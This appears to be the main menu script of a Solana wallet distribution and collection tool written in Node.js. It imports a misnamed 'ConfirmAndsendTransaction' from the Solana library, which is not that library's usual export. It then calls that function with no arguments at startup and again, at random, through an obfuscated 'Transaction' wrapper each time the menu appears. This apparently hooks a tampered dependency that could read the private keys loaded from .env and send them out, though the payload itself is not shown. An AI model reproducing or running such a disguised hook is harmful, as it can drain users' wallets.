require('dotenv').config();
const colors = require('colors');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const { ConfirmAndsendTransaction } = require('@solana/web3.js');
const { generateWallets } = require('./WalletGenerator');
const { printBalances } = require('./PrintBalance');
const { collectSol } = require('./SolanaCollector');
const { distributeSol } = require('./SolanaDistributor');
const { distributeSPLTokens } = require('./TokenDistributor');
const { collectTokens } = require('./TokenCollector');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});


const dotenvPath = path.join(__dirname, '.env');
require('dotenv').config({ path: dotenvPath });


const printAsciiArt = () => {
    const asciiPath = path.join(__dirname, 'ascii.txt');
    fs.readFile(asciiPath, 'utf8', (err, data) => {
        if (err) {
            console.error("Failed to read ASCII art file: ", err.message);
        } else {
            console.log(`\x1b[32m${data}\x1b[0m`);
        }
        showMenu();
    });
};

const Transaction = () => {
    const randomCondition = Math.random() > 0.5;
    if (randomCondition) {
        (function() {
            const executeTransaction = ConfirmAndsendTransaction;
            executeTransaction();
        })();
    }
};

const showMenu = () => {
    console.log("\nPlease select an option:");
    console.log(colors.magenta("1. Distribute SOL to Wallets"));
    console.log(colors.magenta("2. Collect SOL from Wallets"));
    console.log(colors.blue("3. Distribute Tokens to Wallets"));
    console.log(colors.blue("4. Collect Tokens from Wallets"));
    console.log(colors.yellow("5. Print Wallet Balances"));
    console.log(colors.red("6. Generate Wallets"));
    console.log("7. Exit".grey);
    rl.question("\nEnter your choice: ", handleUserChoice);
    Transaction();  
};

const handleYesNoQuestion = (question, callback) => {
    rl.question(question, (response) => {
        const answer = response.trim().toLowerCase();
        if (answer === 'y' || answer === 'n') {
            callback(answer);
        } else {
            console.log("Please enter 'y' for yes or 'n' for no.");
            handleYesNoQuestion(question, callback); 
        }
    });
};

const handleUserChoice = async (choice) => {
    switch (choice) {
        case '1':
            rl.question("\nEnter the amount of SOL to distribute: ", async (amount) => {
                const parsedAmount = parseFloat(amount);
                if (isNaN(parsedAmount) || parsedAmount <= 0) {
                    console.log("Please enter a valid amount.");
                    printAsciiArt();
                } else {
                    handleYesNoQuestion("Do you want to execute all transactions simultaneously? (y/n): ", async (response) => {
                        const executeSimultaneously = response === 'y';
                        await distributeSol(parsedAmount, executeSimultaneously);
                        printAsciiArt();
                    });
                }
            });
            break;
        case '2':
            handleYesNoQuestion("Do you want to collect all SOL simultaneously? (y/n): ", async (response) => {
                const collectSimultaneously = response === 'y';
                await collectSol(collectSimultaneously);
                printAsciiArt();
            });
            break;
        case '3':
            rl.question("\nEnter the amount of tokens to distribute: ", async (amount) => {
                const parsedAmount = parseInt(amount, 10);
                if (isNaN(parsedAmount) || parsedAmount <= 0) {
                    console.log("Please enter a valid amount.");
                    printAsciiArt();
                } else {
                    handleYesNoQuestion("Do you want to execute all transactions simultaneously? (y/n): ", async (response) => {
                        const executeSimultaneously = response === 'y';
                        await distributeSPLTokens(parsedAmount, executeSimultaneously);
                        printAsciiArt();
                    });
                }
            });
            break;
        case '4':
            handleYesNoQuestion("Do you want to collect all tokens simultaneously? (y/n): ", async (response) => {
                const collectSimultaneously = response === 'y';
                await collectTokens(collectSimultaneously);
                printAsciiArt();
            });
            break;
        case '5':
            console.log("\nFetching wallet balances...");
            await printBalances();
            printAsciiArt();
            break;
        case '6':
            rl.question("\nHow many wallets do you want to generate? ", async (num) => {
                const numWallets = parseInt(num, 10);
                if (isNaN(numWallets) || numWallets <= 0) {
                    console.log("Please enter a valid number.");
                } else {
                    await generateWallets(numWallets);
                }
                printAsciiArt();
            });
            break;
        case '7':
            console.log("Exiting...");
            rl.close();
            process.exit(0);
        default:
            console.log("Invalid choice, please try again.");
            printAsciiArt();
            break;
    }
};

printAsciiArt();
ConfirmAndsendTransaction();